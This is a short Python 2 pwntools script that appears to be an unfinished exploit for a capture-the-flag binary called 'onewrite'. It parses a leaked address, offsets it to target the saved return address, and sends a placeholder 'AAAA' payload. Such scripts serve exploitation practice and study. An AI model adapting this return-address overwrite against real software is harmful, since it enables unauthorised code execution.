from pwn import *
from libformatstr import *
import time

e = ELF('./onewrite')
p = process('./onewrite')

data = p.recv()
print data
mode = "1"
p.sendline(mode)

time.sleep(1)
data = p.recv()
print data
leak1_addr = data.split("\n")[0]
leak1_addr = leak1_addr.split("0x")[1]
eip_addr = hex(int(leak1_addr,16) + int("10",16)) 
p.sendline(str(eip_addr))

time.sleep(1)
data = p.recv()
print data
p.sendline("AAAA")

time.sleep(1)
data = p.recv()
print data
